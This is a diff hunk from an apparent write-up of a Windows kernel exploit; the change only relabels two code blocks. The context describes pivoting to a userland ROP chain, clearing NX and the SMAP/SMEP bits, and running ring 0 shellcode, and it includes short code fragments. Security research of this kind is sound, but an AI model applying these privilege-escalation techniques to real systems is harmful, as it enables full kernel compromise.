@@ -472,7 +472,7 @@ int64_t __longjmp_internal(int64_t* arg1, int64_t arg2)
 
 Again since SMAP is disabled we can stack pivot to a rop chain stored in userland that triggers a ring 0 shellcode payload:
 
-```c open
+```c open filename="Userland ROP chain"
 /* ROPgadget works on windows binaries */
   int x = 0;
   void *rc[0x100];
@@ -499,7 +499,7 @@ Again since SMAP is disabled we can stack pivot to a rop chain stored in userlan
 
 In Windows the root page table address is patched directly into certain functions (just look for functions that pertain to page tables, I used `MiCopyTopLevelMappings`) so we can read it out directly from the kernel text, unset the NX bit of the top level page table entry that controls user mappings, unset SMAP and SMEP in cr4, then return directly to shellcode stored in userland.
 
-```x86asm open
+```x86asm open filename="Ring 0 shellcode"
 kernel_shellcode:
     /* current _ETHREAD */
     mov rdx, gs:[0x188]
